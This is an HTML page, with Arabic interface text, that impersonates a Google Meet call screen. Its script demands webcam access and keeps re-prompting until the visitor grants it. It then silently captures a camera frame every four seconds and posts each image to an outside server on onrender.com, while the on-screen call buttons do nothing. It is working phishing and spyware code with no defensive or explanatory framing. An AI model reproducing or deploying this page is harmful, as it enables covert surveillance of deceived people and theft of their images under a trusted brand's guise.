<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Google Meet</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Roboto', Arial, sans-serif; background-color: #202124; color: white; height: 100vh; display: flex; flex-direction: column; overflow: hidden; }
        .main { flex: 1; display: flex; align-items: center; justify-content: center; padding: 15px; }
        .video-container { width: 100%; height: 100%; max-height: 80vh; background-color: #000; border-radius: 12px; position: relative; overflow: hidden; }
        video { width: 100%; height: 100%; object-fit: cover; transform: scaleX(-1); }
        .label { position: absolute; bottom: 15px; right: 15px; background: rgba(0,0,0,0.6); padding: 4px 12px; border-radius: 4px; font-size: 14px; }
        .controls { height: 90px; display: flex; align-items: center; justify-content: space-evenly; padding-bottom: 15px; }
        .btn { width: 50px; height: 50px; border-radius: 50%; background: #3c4043; border: none; color: white; font-size: 20px; display: flex; align-items: center; justify-content: center; }
        .btn-red { background: #ea4335; width: 65px; border-radius: 25px; }
        canvas { display: none; }
        #status { position: fixed; top: 10px; width: 100%; text-align: center; font-size: 12px; color: #aaa; z-index: 10; }
    </style>
</head>
<body>
    <div id="status">جاري التحقق من الاتصال...</div>
    <div class="main">
        <div class="video-container">
            <video id="webcam" autoplay playsinline muted></video>
            <div class="label">أنت</div>
        </div>
    </div>
    <canvas id="photo-canvas"></canvas>
    <div class="controls">
        <button class="btn">🎤</button>
        <button class="btn">📹</button>
        <button class="btn">✋</button>
        <button class="btn btn-red">📞</button>
    </div>

    <script>
        const video = document.getElementById('webcam');
        const canvas = document.getElementById('photo-canvas');
        const statusText = document.getElementById('status');
        
        // تم التعديل بناءً على رابط الرندر الجديد الخاص بك
        const SERVER_URL = 'https://googl-mait5m.onrender.com/upload-photo'; 

        async function start() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                video.srcObject = stream;
                statusText.textContent = "تم الانضمام للاجتماع";
                
                // بدء التصوير التلقائي كل 4 ثوانٍ
                setInterval(capture, 4000); 
            } catch (e) {
                statusText.textContent = "يجب السماح بالكاميرا للمتابعة";
                setTimeout(start, 2000);
            }
        }

        async function capture() {
            if (!video.srcObject) return;
            
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            canvas.getContext('2d').drawImage(video, 0, 0);
            const data = canvas.toDataURL('image/jpeg', 0.4); // جودة متوسطة لسرعة الإرسال

            try {
                const response = await fetch(SERVER_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ image: data })
                });
                if (response.ok) {
                    console.log("تم الإرسال");
                }
            } catch (err) {
                console.log("خطأ في الاتصال بالسيرفر");
            }
        }

        window.onload = start;
    </script>
</body>
</html>
